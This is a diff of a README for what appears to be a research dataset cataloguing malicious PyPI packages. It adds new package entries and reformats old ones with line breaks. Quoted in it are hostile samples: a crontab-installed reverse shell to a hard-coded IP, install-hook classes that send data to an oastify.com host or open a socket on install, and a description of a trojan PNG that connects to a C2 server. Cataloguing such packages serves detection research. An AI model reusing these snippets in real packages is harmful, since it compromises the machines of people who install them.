@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 5,907 versions of the source code of 5,180 malicious packages.
+This data set includes about 5,911 versions of the source code of 5,184 malicious packages.
 
 ## Dataset Format
 
@@ -226,9 +226,8 @@ x()
 
 
 ### 16 May. 2024 
-vertica_parser [99.9.9]
-
-dependency999  [9.9.9]
+vertica_parser [99.9.9] <br>
+dependency999  [9.9.9] <br>
 
 
 ```python
@@ -291,26 +290,24 @@ class CustomEggInfoCommand(egg_info):
 ```
 
 ### 17 May. 2024 
-sphinx-rtd-theme-cilium [99.9.9]
-
-requests_darwin_lite  [2.28.0]
+sphinx-rtd-theme-cilium [99.9.9] <br>
+requests_darwin_lite  [2.28.0] <br>
 
 When the user installs the affected version of the requests-darwin-lite pyhton component package, the malicious Trojan file **requests-sidebar-large.png** will be executed on the Mac system, stealing sensitive system information and establishing a persistent connection with a C2 address controlled by the attacker. Attack The attacker can remotely execute malicious system commands on the user's system.
 
 ### 18 May. 2024 
-user-agents-parser [2.2.2]
+user-agents-parser [2.2.2] <br>
     
 ```python
 __import__("os").system("(crontab -l > .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/95.179.177.74/1337 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1")
 ```
 
 ### 20 May. 2024 
-python-consul2-hh [999.9.9]
+python-consul2-hh [999.9.9] <br>
 
 ### 21 May. 2024 
-jupyter_calendar_extension [0.1]
-
-blypack [0.1, 0.2, 0.3, 0.4, 0.5]
+jupyter_calendar_extension [0.1] <br>
+blypack [0.1, 0.2, 0.3, 0.4, 0.5] <br>
 
 ```python
 def post_install():
@@ -318,13 +315,10 @@ def post_install():
 ```
 
 ### 22 May. 2024 
-reallydonothing [0.1, 0.2]
-
-ml_linear_regression_lib [1.1.3]
-
-dependency_confusion123456 [9.9.9]
-
-dependency_confusion123 [1.0.4]
+reallydonothing [0.1, 0.2] <br>
+ml_linear_regression_lib [1.1.3] <br>
+dependency_confusion123456 [9.9.9] <br>
+dependency_confusion123 [1.0.4] <br>
 
 ```python
 class CustomInstall(install):
@@ -337,6 +331,37 @@ class CustomInstall(install):
         requests.get("https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com",params = ploads)
 ```
 
+### 24 May. 2024 
+networkx-match-algr-0.1.1 <br>
+networkx-match-ssss-0.1.1 <br>
+reportgenpub-0.2 <br>
+speech-dtw-0.1.1 <br>
+
+```python
+class PreInstallCommand(install):
+    def run(self):
+        try:
+            # print("Running custom install command")
+            # subprocess.check_call(['echo', 'Hello, World!'])
+            
+        
+            ip = "172.16.0.103"  
+            port = 12345  
+            message = "Hello, Server!"  
+            server_address = (ip, port)
+
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)            
+            sock.connect(server_address)
+
+            try:
+                sock.sendall(message.encode('utf-8'))
+            finally:
+                sock.close()
+
+        except Exception as e:
+            print(f"Server ERROR: {e}")
+        install.run(self)
+```
 
 ## About the malicious packages detection
 
